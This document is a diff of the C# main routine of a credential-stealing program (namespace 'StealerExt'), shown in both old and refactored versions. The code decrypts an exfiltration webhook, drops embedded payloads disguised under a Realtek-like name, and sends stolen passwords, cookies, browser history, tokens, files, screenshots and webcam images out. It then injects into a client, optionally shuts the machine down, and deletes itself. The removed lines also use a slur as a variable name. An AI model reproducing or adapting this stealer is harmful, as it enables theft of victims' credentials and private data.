@@ -1,72 +1,53 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Net;
 using System.Text;
 using System.Windows.Forms;
 using Newtonsoft.Json;
 using System.Reflection;
 using System.Security.Cryptography;
-using System.Threading;
 
 namespace StealerExt
 {
-    public class Hook
+    internal class Hook
     {
         [STAThread]
         public static void Main(string[] arg)
         {
-            #region Resources & Webhook Decryption
-            string[] resNames = Assembly.GetExecutingAssembly().GetManifestResourceNames(); //Get resources
-            foreach (string resName in resNames)
-            {
-                if (resName.ToLower() != "rtkbtmanserv.properties.resources.resources") { resources(resName); } //Extract resources
-            }
+            if (arg.Length <= 0)
+                throw new ArgumentNullException(nameof(arg));
             try
             {
-                var e = AES128(Convert.FromBase64String(arg[0])); //AES128 Decrypt Webhook 
-                _Santa = new Uri(Encoding.ASCII.GetString(e)).AbsoluteUri; //Get URL
-                _Santa = _Santa.Replace("%00", ""); //Remove SPACES
+                var PaddedDecryptedUrl = AES128(Convert.FromBase64String(arg[0]));
+                _DecryptedHook = new Uri(Encoding.ASCII.GetString(PaddedDecryptedUrl)).AbsoluteUri; 
+                _DecryptedHook = _DecryptedHook.Replace("%00", "");
             }
             catch
             {
-                _Santa = arg[0]; //not encrypted webhook
+                _DecryptedHook = arg[0];
             }
-            #endregion
-            #region Stealer Main Runtime
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
-            ServicePointManager.Expect100Continue = true;
-            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
-            dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config")); //Read user inputs
+            string[] resName = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+            for (int i = 0; i < resName.Length; i++)
+                if (resName[i].ToLower() != "rtkbtmanserv.properties.resources.resources") ExtractResources(resName[i]);
+            dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config"));
             if (File.Exists(API.Temp + "\\ss.png")) File.Delete(API.Temp + "\\ss.png");
-            Stealer.StartSteal(); //Steal IP, Tokens, Product Key...
-            if (File.Exists(API.Temp + "System_INFO.txt")) //Backwards compatiblity
-            {
-                new API(API.wHook)
-                {
-                    _name = API.name,
-                    _ppUrl = API.pfp
-                }.SendSysInfo("**SYSTEM INFO**", API.Temp + "System_INFO.txt");
-            }
-            Capture.CaptureScreen(API.Temp + "\\ss.png"); //Screenshot 
-            API.Screenshot(); //Send ss
-            if (config.cam == true) WebCamCap.wcc(); //Webcam pic
-            #region Send Cred
+            new Stealer().StartSteal();
+            MemoryStream ScreenshotStream = CurrentScreen.GetScreenshot(); 
+            new API(API.wHook).SendScreenshot(ScreenshotStream);            
+            if ((bool)config.cam == true) WebCamCap.wcc();
             API.Passwords();
             API.Cookies();
             API.History();
-            #endregion
-            Injection.StartInjection(); //Inject into client
-            if (config.files == true)
+            Injection.StartInjection();
+            
+            if ((bool)config.files == true)
             {
-                FileStealer.GetFiles(); //File Stealer
+                FileStealer.GetFiles();
             }
-            #region Cleanup
+            
             try
             {
-                File.Delete(API.Temp + "config");
-                File.Delete(API.Temp + "xwizard.exe"); File.Delete(API.Temp + "splwow64.exe"); File.Delete(API.Temp + "winhlp32.exe"); File.Delete(API.Temp + "snuvcdsm.exe"); File.Delete(API.Temp + "hh.exe");
-                File.Delete(API.Temp + "bfsvc.cfg"); File.Delete(API.Temp + "bfsvc.exe"); File.Delete(API.Temp + "whysosad"); File.Delete(API.Temp + "xwizard.cfg");
+                File.Delete(API.Temp + "config"); File.Delete(API.Temp + "whysosad"); File.Delete(API.Temp + "xwizard.cfg");
             }
             catch { }
             foreach (string file in Directory.EnumerateFiles(Path.GetTempPath(), "costura.*", SearchOption.TopDirectoryOnly))
@@ -78,22 +59,25 @@ namespace StealerExt
                 catch
                 { }
             }
-            #endregion
-            if (config.shutdown == true)
+            
+            if ((bool)config.shutdown == true)
             {
-                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
-                psi.CreateNoWindow = true;
-                psi.UseShellExecute = false;
+                var psi = new ProcessStartInfo("shutdown", "/s /t 3")
+                {
+                    CreateNoWindow = true,
+                    UseShellExecute = true
+                };
                 Process.Start(psi);
             }
-            else if (config.restart == true)
+            else if ((bool)config.restart == true)
             {
-                var psi = new ProcessStartInfo("shutdown", "/r /s /t 0");
-                psi.CreateNoWindow = true;
-                psi.UseShellExecute = false;
+                var psi = new ProcessStartInfo("shutdown", "/r /s /t 3")
+                {
+                    CreateNoWindow = true,
+                    UseShellExecute = true
+                };
                 Process.Start(psi);
             }
-            Thread.Sleep(750);
             Process.Start(new ProcessStartInfo()
             {
                 Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
@@ -101,9 +85,9 @@ namespace StealerExt
                 CreateNoWindow = true,
                 FileName = "cmd.exe"
             });
-            #endregion
         }
-        #region Files Extract & >º-yËb¢
+
+        
         public static byte[] AES128(byte[] message)
         {
             try
@@ -124,19 +108,16 @@ namespace StealerExt
                 return null;
             }
         }
-        public static void resources(string resource)
+        public static void ExtractResources(string resource)
         {
-            string gay;
-            gay = resource.Replace("RtkBtManServ.Resources.", "");
-            if (File.Exists(API.Temp + gay)) File.Delete(API.Temp + gay);
+            string resourceName = resource.Replace("RtkBtManServ.Resources.", "");
+            if (File.Exists(API.Temp + resourceName)) File.Delete(API.Temp + resourceName);
             Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource);
-            FileStream fileStream = new FileStream(API.Temp + gay, FileMode.CreateNew);
+            FileStream fileStream = new FileStream(API.Temp + resourceName, FileMode.CreateNew);
             for (int i = 0; i < stream.Length; i++)
                 fileStream.WriteByte((byte)stream.ReadByte());
             fileStream.Close();
         }
-
-        public static string _Santa;
-        #endregion
+        public static string _DecryptedHook;
     }
 }
